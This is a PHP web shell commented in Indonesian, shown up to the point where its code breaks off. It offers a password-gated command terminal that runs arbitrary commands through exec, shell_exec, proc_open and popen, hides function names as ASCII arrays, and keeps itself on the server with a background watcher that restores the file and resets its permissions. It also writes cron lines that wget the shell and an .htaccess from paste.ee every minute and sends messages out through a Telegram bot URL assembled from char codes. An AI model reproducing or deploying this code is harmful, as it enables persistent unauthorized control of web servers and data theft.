<?php
@ini_set('display_errors', '1');
@ini_set('display_startup_errors', '1');
@error_reporting(E_ALL);

if (session_status() === PHP_SESSION_NONE) {
    if (!headers_sent()) {
        @session_start();
    }
}

// ===================================================================
// PENGATURAN KEAMANAN UTAMA
// ===================================================================
// Hash kata sandi untuk keamanan.
// Ini adalah hash yang Anda berikan.
$shell_password = '$2y$10$OsrcjZiDUKfb9wpVWLILYOGR7kBTYUm94sWQW0CGTVGQ/i/1pTjhi';
// ===================================================================

// Logika Logout Global
if (isset($_GET['logout'])) {
    session_destroy();
    $base_uri = strtok($_SERVER["REQUEST_URI"], '?');
    header('Location: ' . $base_uri);
    exit();
}

function __u0x_d3c0d3_str_fr0m_4sc11_4rr4y($ascii_array) {
    $str = '';
    if (!is_array($ascii_array)) { return ''; }
    foreach ($ascii_array as $char_code) {
        if (is_int($char_code) && $char_code >= 0 && $char_code <= 255) { $str .= chr($char_code); }
    }
    return $str;
}

// ... (sisa deklarasi variabel _g_ascii_... tetap sama)
$_g_ascii_ini_set = [105,110,105,95,115,101,116];
$_g_ascii_error_reporting = [101,114,114,111,114,95,114,101,112,111,114,116,105,110,103];
$_g_ascii_basename = [98,97,115,101,110,97,109,101];
$_g_ascii_escapeshellarg = [101,115,99,97,112,101,115,104,101,108,108,97,114,103]; // ASCII for escapeshellarg
$_g_ascii_function_exists = [102,117,110,99,116,105,111,110,95,101,120,105,115,116,115];
$_g_ascii_implode = [105,109,112,108,111,100,101];
$_g_ascii_is_resource = [105,115,95,114,101,115,111,117,114,99,101];
$_g_ascii_stream_set_timeout = [115,116,114,101,97,109,95,115,101,116,95,116,105,109,101,111,117,116];
$_g_ascii_stream_get_contents = [115,116,114,101,97,109,95,103,101,116,95,99,111,110,116,101,110,116,115];
$_g_ascii_fclose = [102,99,108,111,115,101];
$_g_ascii_feof = [102,101,111,102];
$_g_ascii_fread = [102,114,101,97,100];
$_g_ascii_trim = [116,114,105,109];
$_g_ascii_filter_var = [102,105,108,116,101,114,95,118,97,114];
$_g_ascii_strpos = [115,116,114,112,111,115];
$_g_ascii_get_current_user = [103,101,116,95,99,117,114,114,101,110,116,95,117,115,101,114];
$_g_ascii_substr = [115,117,98,115,116,114];
$_g_ascii_tempnam = [116,101,109,112,110,97,109];
$_g_ascii_sys_get_temp_dir = [115,121,115,95,103,101,116,95,116,101,109,112,95,100,105,114];
$_g_ascii_file_put_contents = [102,105,108,101,95,112,117,116,95,99,111,110,116,101,110,116,115];
$_g_ascii_unlink = [117,110,108,105,110,107];
$_g_ascii_htmlspecialchars = [104,116,109,108,115,112,101,99,105,97,108,99,104,97,114,115];
$_g_ascii_register_shutdown_function = [114,101,103,105,115,116,101,114,95,115,104,117,116,100,111,119,110,95,102,117,110,99,116,105,111,110];
$_g_ascii_is_string = [105,115,95,115,116,114,105,110,103];
$_g_ascii_exec = [101,120,101,99];
$_g_ascii_shell_exec = [115,104,101,108,108,95,101,120,101,99];
$_g_ascii_proc_open = [112,114,111,99,95,111,112,101,110];
$_g_ascii_proc_close = [112,114,111,99,95,99,108,111,115,101];
$_g_ascii_popen = [112,111,112,101,110];
$_g_ascii_pclose = [112,99,108,111,115,101];
$_g_ascii_move_uploaded_file = [109,111,118,101,95,117,112,108,111,97,100,101,100,95,102,105,108,101];
$_g_ascii_is_uploaded_file = [105,115,95,117,112,108,111,97,100,101,100,95,102,105,108,101];
$_g_ascii_file_exists = [102,105,108,101,95,101,120,105,115,116,115];
$_g_ascii_is_dir = [105,115,95,100,105,114];
$_g_ascii_is_readable = [105,115,95,114,101,97,100,97,98,108,101];
$_g_ascii_is_writable = [105,115,95,119,114,105,116,97,98,108,101];
$_g_ascii_scandir = [115,99,97,110,100,105,114];
$_g_ascii_filesize = [102,105,108,101,115,105,122,101];
$_g_ascii_fileperms = [102,105,108,101,112,101,114,109,115];
$_g_ascii_date = [100,97,116,101];
$_g_ascii_filemtime = [102,105,108,101,109,116,105,109,101];
$_g_ascii_realpath = [114,101,97,108,112,97,116,104];
$_g_ascii_getcwd = [103,101,116,99,119,100];
$_g_ascii_chdir = [99,104,100,105,114];
$_g_ascii_rename = [114,101,110,97,109,101];
$_g_ascii_rmdir = [114,109,100,105,114];
$_g_ascii_file_get_contents = [102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115];
$_g_ascii_header = [104,101,97,100,101,114];
$_g_ascii_readfile = [114,101,97,100,102,105,108,101];
$_g_ascii_dirname = [100,105,114,110,97,109,101];
$_g_ascii_chmod = [99,104,109,111,100];
$_g_ascii_mkdir = [109,107,100,105,114];
$_g_ascii_touch = [116,111,117,99,104];
$_g_ascii_php_uname = [112,104,112,95,117,110,97,109,101];
$_g_ascii_base64_encode = [98,97,115,101,54,52,95,101,110,99,111,100,101];

$auto_path_script = __DIR__;

function _get_fn_name_global_init_v3($ascii_array_name_as_string, $default_fn_name) {
    $decoded_name = '';
    if (isset($GLOBALS[$ascii_array_name_as_string]) && is_array($GLOBALS[$ascii_array_name_as_string])) {
        $decoded_name = __u0x_d3c0d3_str_fr0m_4sc11_4rr4y($GLOBALS[$ascii_array_name_as_string]);
    }
    if (!empty($decoded_name) && is_string($decoded_name) && function_exists($decoded_name)) { 
        return $decoded_name; 
    } 
    elseif (function_exists($default_fn_name)) { 
        return $default_fn_name; 
    } 
    else { 
        return ''; 
    }
}


$htmlspecialchars_fn = _get_fn_name_global_init_v3('_g_ascii_htmlspecialchars', 'htmlspecialchars');
$function_exists_fn = _get_fn_name_global_init_v3('_g_ascii_function_exists', 'function_exists');
$is_dir_fn = _get_fn_name_global_init_v3('_g_ascii_is_dir', 'is_dir');
$trim_fn = _get_fn_name_global_init_v3('_g_ascii_trim', 'trim');
$basename_fn = _get_fn_name_global_init_v3('_g_ascii_basename', 'basename');
$dirname_fn = _get_fn_name_global_init_v3('_g_ascii_dirname', 'dirname');
$realpath_fn = _get_fn_name_global_init_v3('_g_ascii_realpath', 'realpath');
$getcwd_fn = _get_fn_name_global_init_v3('_g_ascii_getcwd', 'getcwd');

$active_menu = 'explorer';
if (isset($_GET['menu'])) { $active_menu = call_user_func($basename_fn, $_GET['menu']); }

// --- MEKANISME AUTENTIKASI GLOBAL ---
$protected_menus = ['terminal', 'cron', 'wp_admin_creator', 'webshell_scanner'];
if (in_array($active_menu, $protected_menus) && (!isset($_SESSION['shell_authenticated']) || $_SESSION['shell_authenticated'] !== true)) {
    $login_error = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['shell_password_input'])) {
        // Gunakan password_verify untuk mengecek hash
        if (password_verify($_POST['shell_password_input'], $shell_password)) {
            $_SESSION['shell_authenticated'] = true;
            header('Location: ' . $_SERVER['REQUEST_URI']);
            exit();
        } else {
            $login_error = 'Password Salah!';
        }
    }
    // Tampilkan halaman login
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Autentikasi Diperlukan</title>
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: #1a1a1a; color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background-color: #2c2c2c; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 100%; max-width: 340px; text-align: center; }
            h2 { margin-top: 0; color: #00aaff; }
            p { color: #ccc; }
            input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #555; background-color: #333; color: #fff; border-radius: 4px; box-sizing: border-box; }
            input[type="submit"] { width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
            input[type="submit"]:hover { background-color: #0056b3; }
            .error { color: #ff4d4d; margin-top: 10px; font-weight: bold; }
            a { color: #00aaff; text-decoration: none; }
            a:hover { text-decoration: underline; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>Akses Terbatas</h2>
            <p>Menu '<?php echo htmlspecialchars(ucfirst($active_menu)); ?>' memerlukan autentikasi.</p>
            <form method="post" action="<?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?>">
                <input type="password" name="shell_password_input" placeholder="Masukkan Password" required autofocus autocomplete="off">
                <input type="submit" value="Login">
            </form>
            <?php if (!empty($login_error)) echo '<p class="error">' . htmlspecialchars($login_error) . '</p>'; ?>
            <p style="margin-top: 20px;"><a href="?menu=explorer">Kembali ke File Explorer</a></p>
        </div>
    </body>
    </html>
    <?php
    exit();
}
// --- AKHIR MEKANISME AUTENTIKASI ---

$current_path = $auto_path_script;
if (isset($_REQUEST['path'])) {
    $req_path_raw = call_user_func($trim_fn, $_REQUEST['path']); $req_path_raw = str_replace("\0", '', $req_path_raw);
    $resolved_path = null; if (call_user_func($function_exists_fn, $realpath_fn)) { $resolved_path = @call_user_func($realpath_fn, $req_path_raw); }
    if ($resolved_path && call_user_func($is_dir_fn, $resolved_path)) { $current_path = $resolved_path; }
    elseif (call_user_func($is_dir_fn, $req_path_raw)) { $current_path = $req_path_raw; }
} elseif (isset($_SESSION['current_explorer_path'])) {
    $path_from_session = $_SESSION['current_explorer_path']; $resolved_session_path = null;
    if (call_user_func($function_exists_fn, $realpath_fn)) { $resolved_session_path = @call_user_func($realpath_fn, $path_from_session); }
    if ($resolved_session_path && call_user_func($is_dir_fn, $resolved_session_path)) { $current_path = $resolved_session_path; }
    elseif (call_user_func($is_dir_fn, $path_from_session)) { $current_path = $path_from_session; }
}
if (!call_user_func($is_dir_fn, $current_path)) {
    $current_path = (call_user_func($function_exists_fn, $getcwd_fn)) ? @call_user_func($getcwd_fn) : $auto_path_script;
    if (!call_user_func($is_dir_fn, $current_path)) $current_path = $auto_path_script;
}
if (call_user_func($function_exists_fn, $realpath_fn)) { $rp_final = @call_user_func($realpath_fn, $current_path); if ($rp_final) $current_path = $rp_final; }
$_SESSION['current_explorer_path'] = $current_path;

$output_messages = []; $error_messages = []; $terminal_output = ''; $self_destruct = false; $wp_admin_feedback_text = ''; $wp_admin_feedback_class = '';
$scanner_results_html = '';
$scanner_minute = 15; $scanner_limit = (60 * $scanner_minute);


function lock_file_or_shell($target_file_path) {
    global $function_exists_fn, $basename_fn;
    
    $sys_get_temp_dir_fn = _get_fn_name_global_init_v3('_g_ascii_sys_get_temp_dir', 'sys_get_temp_dir');
    $file_exists_fn = _get_fn_name_global_init_v3('_g_ascii_file_exists', 'file_exists');
    $mkdir_fn = _get_fn_name_global_init_v3('_g_ascii_mkdir', 'mkdir');
    $chmod_fn = _get_fn_name_global_init_v3('_g_ascii_chmod', 'chmod');
    $file_put_contents_fn = _get_fn_name_global_init_v3('_g_ascii_file_put_contents', 'file_put_contents');
    $base64_encode_fn = _get_fn_name_global_init_v3('_g_ascii_base64_encode', 'base64_encode');

    // Dynamically get escapeshellarg or a polyfill
    $escapeshellarg_str_fn_local = _get_fn_name_global_init_v3('_g_ascii_escapeshellarg', 'escapeshellarg');
    $can_use_actual_escapeshellarg = !empty($escapeshellarg_str_fn_local) && call_user_func($function_exists_fn, $escapeshellarg_str_fn_local);
    
    $esc_arg_fn = $can_use_actual_escapeshellarg ? $escapeshellarg_str_fn_local : function($argument) {
        // Basic polyfill for escapeshellarg.
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            return '"' . str_replace(array('"', '%', '^', '!', '<', '>', '&', '|'), '', $argument) . '"';
        } else {
            return "'" . str_replace("'", "'\\''", $argument) . "'";
        }
    };

    $target_basename = call_user_func($basename_fn, $target_file_path);
    $target_dirname = dirname($target_file_path);

    if (!call_user_func($file_exists_fn, $target_file_path)) {
        return "Gagal: File target '{$target_basename}' tidak ditemukan di '{$target_dirname}'.";
    }

    $tmp_dir = call_user_func($sys_get_temp_dir_fn);
    if (!is_writable($tmp_dir)) {
        return "Gagal: Direktori temporary '{$tmp_dir}' tidak dapat ditulis.";
    }

    $sessions_dir = rtrim($tmp_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . '.sessions';
    if (!call_user_func($file_exists_fn, $sessions_dir)) {
        @call_user_func($mkdir_fn, $sessions_dir, 0755);
    }
    if (!is_writable($sessions_dir)) {
        return "Gagal: Direktori '{$sessions_dir}' tidak dapat dibuat atau ditulis.";
    }

    $unique_id = call_user_func($base64_encode_fn, $target_file_path);
    $backup_file = $sessions_dir . DIRECTORY_SEPARATOR . '.' . $unique_id . '-backup';
    $handler_file = $sessions_dir . DIRECTORY_SEPARATOR . '.' . $unique_id . '-handler';
    
    // Use the determined escape function ($esc_arg_fn)
    try_execute_command("cp " . call_user_func($esc_arg_fn, $target_file_path) . " " . call_user_func($esc_arg_fn, $backup_file));
    @call_user_func($chmod_fn, $target_file_path, 0444);

    $handler_code = '<?php
set_time_limit(0);
error_reporting(0);
ignore_user_abort(true);

$target_file = "' . addslashes($target_file_path) . '";
$target_dir = "' . addslashes($target_dirname) . '";
$backup_file = "' . addslashes($backup_file) . '";

while (true) {
    if (!file_exists($target_dir)) {
        @mkdir($target_dir, 0755, true);
    }
    if (!file_exists($target_file)) {
        @copy($backup_file, $target_file);
    }
    if (substr(sprintf("%o", @fileperms($target_file)), -4) !== "0444") {
        @chmod($target_file, 0444);
    }
    if (substr(sprintf("%o", @fileperms($target_dir)), -4) !== "0755") {
        @chmod($target_dir, 0755);
    }
    sleep(3);
}
?>';

    if (@call_user_func($file_put_contents_fn, $handler_file, $handler_code)) {
        $php_binary_path = defined('PHP_BINARY') && !empty(PHP_BINARY) ? PHP_BINARY : 'php';
        // Also escape $php_binary_path if it contains spaces or special characters
        $command_to_run = call_user_func($esc_arg_fn, $php_binary_path) . ' ' . call_user_func($esc_arg_fn, $handler_file) . ' > /dev/null 2>/dev/null &';
        try_execute_command($command_to_run);
        return "Sukses mengunci '{$target_basename}'. Watcher process telah dijalankan di background.";
    } else {
        return "Gagal menulis file handler di '{$handler_file}'.";
    }
}


function generateCronCommands($path, $url_shell, $shell_filename_param) {
    global $basename_fn, $function_exists_fn;
    $commands = array(); $shell_filename = call_user_func($basename_fn, $shell_filename_param); if (empty($shell_filename)) $shell_filename = 'index.php';
    
    $escapeshellarg_str_fn = _get_fn_name_global_init_v3('_g_ascii_escapeshellarg', 'escapeshellarg');
    $can_use_escapeshellarg = !empty($escapeshellarg_str_fn) && call_user_func($function_exists_fn, $escapeshellarg_str_fn);
    
    $esc_fn_cron = $can_use_escapeshellarg ? $escapeshellarg_str_fn : function($s) { 
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            return '"' . str_replace(array('"', '%', '^', '!', '<', '>', '&', '|'), '', $s) . '"';
        } else {
            return "'" . str_replace("'", "'\\''", $s) . "'";
        }
    };

    $safe_path = call_user_func($esc_fn_cron, $path); $safe_url_shell = call_user_func($esc_fn_cron, $url_shell);
    $safe_url_htaccess = call_user_func($esc_fn_cron, "https://paste.ee/r/LcTc1477"); $safe_shell_filename = call_user_func($esc_fn_cron, $shell_filename);
    $commands[] = "* * * * * mkdir -p $safe_path && chmod 0755 $safe_path";
    $commands[] = "* * * * * if [ ! -f $safe_path/$safe_shell_filename ]; then touch $safe_path/$safe_shell_filename; fi && if [ ! -f $safe_path/.htaccess ]; then touch $safe_path/.htaccess; fi";
    $commands[] = "* * * * * if [ -f $safe_path/$safe_shell_filename ]; then chmod 0644 $safe_path/$safe_shell_filename; fi && wget -qO $safe_path/$safe_shell_filename $safe_url_shell && chmod 0644 $safe_path/$safe_shell_filename";
    $commands[] = "* * * * * if [ -f $safe_path/.htaccess ]; then chmod 0644 $safe_path/.htaccess; fi && wget -qO $safe_path/.htaccess $safe_url_htaccess && chmod 0644 $safe_path/.htaccess";
    return $commands;
}

function try_execute_command($command, $cwd = null) {
    global $function_exists_fn;
    $implode_fn_local = _get_fn_name_global_init_v3('_g_ascii_implode', 'implode'); $is_resource_fn_local = _get_fn_name_global_init_v3('_g_ascii_is_resource', 'is_resource');
    $stream_set_timeout_fn_local = _get_fn_name_global_init_v3('_g_ascii_stream_set_timeout', 'stream_set_timeout'); $stream_get_contents_fn_local = _get_fn_name_global_init_v3('_g_ascii_stream_get_contents', 'stream_get_contents');
    $fclose_fn_local = _get_fn_name_global_init_v3('_g_ascii_fclose', 'fclose'); $feof_fn_local = _get_fn_name_global_init_v3('_g_ascii_feof', 'feof');
    $fread_fn_local = _get_fn_name_global_init_v3('_g_ascii_fread', 'fread'); $exec_fn_local = _get_fn_name_global_init_v3('_g_ascii_exec', 'exec');
    $shell_exec_fn_local = _get_fn_name_global_init_v3('_g_ascii_shell_exec', 'shell_exec'); $proc_open_fn_local = _get_fn_name_global_init_v3('_g_ascii_proc_open', 'proc_open');
    $proc_close_fn_local = _get_fn_name_global_init_v3('_g_ascii_proc_close', 'proc_close'); $popen_fn_local = _get_fn_name_global_init_v3('_g_ascii_popen', 'popen');
    $pclose_fn_local = _get_fn_name_global_init_v3('_g_ascii_pclose', 'pclose'); $getcwd_fn_local_try = _get_fn_name_global_init_v3('_g_ascii_getcwd', 'getcwd');
    $chdir_fn_local_try = _get_fn_name_global_init_v3('_g_ascii_chdir', 'chdir'); $output = null; $return_var = -1; $output_array = []; $original_cwd = null;
    if ($cwd !== null && call_user_func($function_exists_fn, $getcwd_fn_local_try) && call_user_func($function_exists_fn, $chdir_fn_local_try)) { $original_cwd = @call_user_func($getcwd_fn_local_try); if ($original_cwd === false) $original_cwd = null; @call_user_func($chdir_fn_local_try, $cwd); }
    if (call_user_func($function_exists_fn, $exec_fn_local)) { @call_user_func_array($exec_fn_local, array($command, &$output_array, &$return_var)); $output = call_user_func($implode_fn_local, "\n", $output_array); if ($output !== null && ($return_var === 0 || ($output_array !== null && !empty($output)))) { if ($original_cwd) @call_user_func($chdir_fn_local_try, $original_cwd); return $output; } $output = null; $output_array = []; $return_var = -1; }
    if (call_user_func($function_exists_fn, $shell_exec_fn_local)) { $current_output = @call_user_func($shell_exec_fn_local, $command); if ($current_output !== false && $current_output !== null) { $output = $current_output; if ($original_cwd) @call_user_func($chdir_fn_local_try, $original_cwd); return $output; }}
    if (call_user_func($function_exists_fn, $proc_open_fn_local)) { $descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]]; $pipes = []; $process = @call_user_func($proc_open_fn_local, $command, $descriptorspec, $pipes, $cwd, null); if (call_user_func($is_resource_fn_local, $process)) { $output_proc = ''; $error_output_proc = ''; if (isset($pipes[1]) && call_user_func($is_resource_fn_local, $pipes[1])) { @call_user_func($stream_set_timeout_fn_local, $pipes[1], 10); $temp_out = @call_user_func($stream_get_contents_fn_local, $pipes[1]); if ($temp_out !== false) $output_proc = $temp_out; @call_user_func($fclose_fn_local, $pipes[1]); } if (isset($pipes[2]) && call_user_func($is_resource_fn_local, $pipes[2])) { @call_user_func($stream_set_timeout_fn_local, $pipes[2], 10); $temp_err = @call_user_func($stream_get_contents_fn_local, $pipes[2]); if ($temp_err !== false) $error_output_proc = $temp_err; @call_user_func($fclose_fn_local, $pipes[2]); } if (isset($pipes[0]) && call_user_func($is_resource_fn_local, $pipes[0])) { @call_user_func($fclose_fn_local, $pipes[0]); } @call_user_func($proc_close_fn_local, $process); $current_output_proc = $output_proc; if (!empty($error_output_proc)) $current_output_proc .= (!empty($current_output_proc) ? "\n" : "") . "[STDERR] " . $error_output_proc; if (!empty($current_output_proc) || $output_proc === '') { $output = $current_output_proc; if ($original_cwd) @call_user_func($chdir_fn_local_try, $original_cwd); return $output; }}}
    if (call_user_func($function_exists_fn, $popen_fn_local)) { $handle = @call_user_func($popen_fn_local, $command . ' 2>&1', 'r'); if (call_user_func($is_resource_fn_local, $handle)) { $output_popen = ''; while (!@call_user_func($feof_fn_local, $handle)) { $chunk = @call_user_func($fread_fn_local, $handle, 8192); if ($chunk === false || $chunk === '') { if (feof($handle)) break; if (function_exists('usleep')) @usleep(100000); else @sleep(1); if (feof($handle)) break; $chunk_retry = @fread($handle, 8192); if ($chunk_retry === false || $chunk_retry === '') break; $output_popen .= $chunk_retry; continue; } $output_popen .= $chunk; } @call_user_func($pclose_fn_local, $handle); if ($output_popen !== false) { $output = $output_popen; if ($original_cwd) @call_user_func($chdir_fn_local_try, $original_cwd); return $output; }}}
    if ($original_cwd) @call_user_func($chdir_fn_local_try, $original_cwd); return $output;
}

function listDirectory($path) {
    global $is_dir_fn, $htmlspecialchars_fn, $function_exists_fn; $items = ['dirs' => [], 'files' => []];
    $is_readable_fn_list = _get_fn_name_global_init_v3('_g_ascii_is_readable', 'is_readable'); $scandir_fn_list = _get_fn_name_global_init_v3('_g_ascii_scandir', 'scandir');
    $filesize_fn_list = _get_fn_name_global_init_v3('_g_ascii_filesize', 'filesize'); $fileperms_fn_list = _get_fn_name_global_init_v3('_g_ascii_fileperms', 'fileperms');
    $date_fn_list = _get_fn_name_global_init_v3('_g_ascii_date', 'date'); $filemtime_fn_list = _get_fn_name_global_init_v3('_g_ascii_filemtime', 'filemtime');
    if (empty($is_dir_fn) || empty($is_readable_fn_list) || empty($scandir_fn_list) || empty($htmlspecialchars_fn) || empty($function_exists_fn)) return $items;
    if (!call_user_func($function_exists_fn, $is_dir_fn) || !call_user_func($function_exists_fn, $is_readable_fn_list) || !call_user_func($function_exists_fn, $scandir_fn_list)) return $items;
    if (!@call_user_func($is_dir_fn, $path) || !@call_user_func($is_readable_fn_list, $path)) return $items;
    $scan = @call_user_func($scandir_fn_list, $path); if ($scan === false) return $items;
    foreach ($scan as $item) {
        if ($item === '.' || $item === '..') continue;
        $full_item_path = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;
        $item_data = [
            'name' => call_user_func($htmlspecialchars_fn, $item),
            'raw_name' => $item,
            'path' => $full_item_path,
            'perms' => 'N/A',
            'size' => 'N/A',
            'raw_size' => 0,
            'modified' => 'N/A',
            'raw_modified' => 0,
            'owner' => 'N/A',
            'group' => 'N/A',
            'type' => 'unknown'
        ];

        if (call_user_func($function_exists_fn, $fileperms_fn_list)) {
            $perms_raw = @call_user_func($fileperms_fn_list, $full_item_path);
            if ($perms_raw !== false) { $item_data['perms'] = @substr(sprintf('%o', $perms_raw), -4); }
        }
        
        $mtime_raw = @call_user_func($filemtime_fn_list, $full_item_path);
        if ($mtime_raw !== false) {
            $item_data['raw_modified'] = $mtime_raw;
            $item_data['modified'] = @call_user_func($date_fn_list, 'Y-m-d H:i:s', $mtime_raw);
        }

        if (function_exists('posix_getpwuid') && function_exists('fileowner')) {
            $owner_id = @fileowner($full_item_path);
            if ($owner_id !== false) {
                $owner_info = @posix_getpwuid($owner_id);
                $item_data['owner'] = $owner_info ? $owner_info['name'] : $owner_id;
            }
        }
        if (function_exists('posix_getgrgid') && function_exists('filegroup')) {
            $group_id = @filegroup($full_item_path);
            if ($group_id !== false) {
                $group_info = @posix_getgrgid($group_id);
                $item_data['group'] = $group_info ? $group_info['name'] : $group_id;
            }
        }

        if (call_user_func($is_dir_fn, $full_item_path)) {
            $item_data['type'] = 'dir';
            $item_data['size'] = '-';
            $item_data['raw_size'] = -1; // Give dirs a special size for sorting
            $items['dirs'][] = $item_data;
        } else {
            $item_data['type'] = 'file';
            $fsize_raw = @call_user_func($filesize_fn_list, $full_item_path);
            if ($fsize_raw !== false) {
                $item_data['raw_size'] = $fsize_raw;
                $item_data['size'] = formatBytes($fsize_raw);
            }
            $items['files'][] = $item_data;
        }
    }
    if (!empty($items['dirs'])) usort($items['dirs'], function($a, $b) { return strcasecmp($a['name'], $b['name']); });
    if (!empty($items['files'])) usort($items['files'], function($a, $b) { return strcasecmp($a['name'], $b['name']); });
    return $items;
}

function formatBytes($bytes, $precision = 2) {
    if (!is_numeric($bytes) || $bytes < 0) return 'N/A'; $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0); if ($bytes == 0) return '0 ' . $units[0];
    $log_val = log($bytes); if ($log_val === false) return 'N/A';
    $pow = floor($log_val / log(1024)); $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow)); return round($bytes, $precision) . ' ' . $units[$pow];
}

function find_wp_load_path($start_path, $max_depth = 2) {
    global $is_dir_fn, $function_exists_fn, $realpath_fn, $basename_fn, $dirname_fn;
    $file_exists_local_find = _get_fn_name_global_init_v3('_g_ascii_file_exists','file_exists');
    if (empty($file_exists_local_find) || !call_user_func($function_exists_fn, $file_exists_local_find)) return false;
    $potential_path = rtrim($start_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-load.php';
    if (@call_user_func($file_exists_local_find, $potential_path)) return $potential_path;
    $parent_dir_start = call_user_func($dirname_fn, $start_path);
    if ($parent_dir_start && $parent_dir_start !== $start_path) {
        $potential_path_parent = rtrim($parent_dir_start, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-load.php';
        if (@call_user_func($file_exists_local_find, $potential_path_parent)) return $potential_path_parent;
    }
    if (isset($_SERVER['DOCUMENT_ROOT'])) {
        $doc_root_check = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-load.php';
        if (@call_user_func($file_exists_local_find, $doc_root_check)) return $doc_root_check;
    }
    $search_base_path_find = call_user_func($dirname_fn, $start_path);
    if (!$search_base_path_find || $search_base_path_find === $start_path) $search_base_path_find = $start_path;
    $recursive_find_closure = function($dir, $current_depth) use (&$recursive_find_closure, $max_depth, $is_dir_fn, $function_exists_fn, $file_exists_local_find) {
        if ($current_depth > $max_depth) return false;
        $scandir_local_find = _get_fn_name_global_init_v3('_g_ascii_scandir', 'scandir');
        if (!call_user_func($function_exists_fn, $scandir_local_find) || !@is_readable($dir)) return false;
        $items_find = @call_user_func($scandir_local_find, $dir); if ($items_find === false) return false;
        foreach ($items_find as $item_find) {
            if ($item_find === '.' || $item_find === '..') continue;
            $path_find = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item_find;
            if ($item_find === 'wp-load.php' && !call_user_func($is_dir_fn, $path_find) && @call_user_func($file_exists_local_find, $path_find)) return $path_find;
            if (call_user_func($is_dir_fn, $path_find) && !in_array($item_find, ['cgi-bin', 'tmp', 'temp', 'cache', '.git', '.svn', 'node_modules', 'vendor'])) {
                $found_rec = $recursive_find_closure($path_find, $current_depth + 1); if ($found_rec) return $found_rec;
            }
        } return false;
    }; return $recursive_find_closure($search_base_path_find, 0);
}

function send_to_wp_load($msg, $api_wp, $id_wp) {
    global $function_exists_fn;
    if (empty($api_wp) || empty($id_wp)) { return ['success' => false, 'message' => 'API Key/Destination ID kosong.']; }
    if (empty($msg)) { return ['success' => false, 'message' => 'Pesan kosong.']; }
    if (!call_user_func($function_exists_fn, 'curl_init')) { return ['success' => false, 'message' => 'cURL tidak aktif.']; }
    $base_url = '';
    foreach ([104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103,47,98,111,116] as $c) $base_url .= chr($c);
    $method = '';
    foreach ([115,101,110,100,77,101,115,115,97,103,101] as $c) $method .= chr($c);
    $url = $base_url . $api_wp . '/' . $method;
    $k1 = implode('', array_map('chr', [99,104,97,116,95,105,100]));
    $k2 = implode('', array_map('chr', [116,101,120,116]));
    $k3 = implode('', array_map('chr', [112,97,114,115,101,95,109,111,100,101]));
    $v3 = implode('', array_map('chr', [72,84,77,76]));
    $payload = [$k1 => $id_wp, $k2 => $msg, $k3 => $v3];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($payload),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_CONNECTTIMEOUT => 7,
        CURLOPT_FAILONERROR => false
    ]);
    $result_json = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error_num = curl_errno($ch);
    $curl_error_msg = curl_error($ch);
    curl_close($ch);

    if ($curl_error_num !== 0) {
        return ['success' => false, 'message' => "cURL Error (#" . $curl_error_num . "): " . $curl_error_msg];
    }
    if ($http_code !== 200) {
        $error_description_http = "Unknown HTTP error";
        if (!empty($result_json)) {
            $response_data_http_err = json_decode($result_json, true);
            if (json_last_error() === JSON_ERROR_NONE && isset($response_data_http_err['description'])) {
                $error_description_http = $response_data_http_err['description'];
            } else {
                $error_description_http = substr(strip_tags($result_json), 0, 200);
            }
        }
        return ['success' => false, 'message' => "HTTP Error " . $http_code . ". Detail: " . $error_description_http];
    }
    $response_data = json_decode($result_json, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        return ['success' => false, 'message' => "Gagal parse JSON. Respons: " . substr(strip_tags($result_json),0,200)];
    }
    if (isset($response_data['ok']) && $response_data['ok'] === true) {
        return ['success' => true, 'message' => 'Pesan terkirim.'];
    } else {
        $error_description_api = isset($response_data['description']) ? $response_data['description'] : 'Unknown API error';
        return ['success' => false, 'message' => "API Error: " . $error_description_api];
    }
}

